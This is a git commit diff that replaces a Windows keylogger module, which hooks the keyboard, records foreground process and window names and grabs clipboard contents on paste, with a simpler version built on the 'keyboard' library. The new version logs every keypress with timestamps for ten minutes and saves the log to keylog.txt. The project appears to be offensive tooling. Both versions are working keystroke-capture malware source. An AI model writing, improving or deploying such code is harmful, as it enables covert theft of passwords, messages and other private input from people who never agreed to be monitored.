a7a3c5e664065fa47c086ec7d6809f77a82c4246
Rskladanek <remek.skladanek@wp.pl>
2024-11-29 17:19:41 +0100

    Updaed keylogger cuz the last one didnt worked on windows

--- modules/keylogger.py
+++ modules/keylogger.py
@@ -1,91 +1,44 @@
-from ctypes import byref, create_string_buffer, c_ulong, windll
-from io import StringIO
-
-
-import os
-import pythoncom
-import pyWinhook as pyHook
-import sys
+import keyboard
 import time
-import win32clipboard
-
-
-TIMEOUT = 60*10
-
-
+import threading
 
 class KeyLogger:
     def __init__(self):
-        self.current_window = None
-    
-    def get_current_process(self):
-        # Get the handle to the current foreground window
-        hwnd = windll.user32.GetForegroundWindow()
-        
-        # Get the process ID of the current foreground window
-        pid = c_ulong(0)
-        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
-        process_id = f'{pid.value}'
-        
-        # Get the executable name of the process
-        executable = create_string_buffer(512)
-        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
-        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
-        
-        # Get the title of the foreground window
-        window_title = create_string_buffer(512)
-        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
-        try:
-            self.current_window = window_title.value.decode()
-        except UnicodeDecodeError as e:
-            print(f'{e}: Unknown window name')
+        self.log = []
+        self.stop_event = threading.Event()
 
-        # Print the process information
-        print('\n', process_id, executable.value.decode(), self.current_window)
+    def log_key(self, event):
+        # Log key with a timestamp for better context
+        self.log.append((event.name, time.strftime('%Y-%m-%d %H:%M:%S')))
 
-        # Close handles to avoid resource leaks
-        windll.kernel32.CloseHandle(hwnd)
-        windll.kernel32.CloseHandle(h_process)
+    def start(self):
+        keyboard.on_press(self.log_key)
 
-    def mykeystroke(self, event):
-        # If the window has changed, get the new process details
-        if event.WindowName != self.current_window:
-            self.get_current_process()
-        
-        # If the key is printable, log it directly
-        if 32 < event.Ascii < 127:
-            print(chr(event.Ascii), end='')
-        else:
-            # Handle special cases like clipboard paste
-            if event.Key == 'V':
-                win32clipboard.OpenClipboard()
-                value = win32clipboard.GetClipboardData()
-                win32clipboard.CloseClipboard()
-                print(f'[PASTE] - {value}')
-            else:
-                # Log non-printable keys
-                print(f'{event.Key}')  
-        return True
+    def stop(self):
+        keyboard.unhook_all()
+
+    def save_to_file(self, filename='keylog.txt'):
+        # Save logs to a file
+        with open(filename, 'w') as f:
+            for key, timestamp in self.log:
+                f.write(f'{timestamp}: {key}\n')
 
 def run():
-    # Redirect stdout to capture the keylogging output
-    save_stdout = sys.stdout
-    sys.stdout = StringIO()
+    logger = KeyLogger()
+    logger.start()
+    timeout = time.time() + 60 * 10  # 10 minutes
 
-    kl = KeyLogger()
-    hm = pyHook.HookManager()
-    hm.KeyDown = kl.mykeystroke
-    hm.HookKeyboard()
-    
-    # Run the keylogger for the specified timeout period
-    while time.thread_time() < TIMEOUT:
-        pythoncom.PumpWaitingMessages()
-        
-    # Retrieve the log and restore stdout
-    log = sys.stdout.getvalue()
-    sys.stdout = save_stdout
-    return log
-    
+    try:
+        while not logger.stop_event.is_set() and time.time() < timeout:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nKeylogging interrupted by user.")
+    finally:
+        logger.stop()
+        logger.save_to_file()
+        print("Keylogging stopped. Log saved to 'keylog.txt'.")
+    return ' '.join(key for key, _ in logger.log)
+
 if __name__ == '__main__':
-    print(run())  # Print the captured log
+    print(run())
     print('End.')
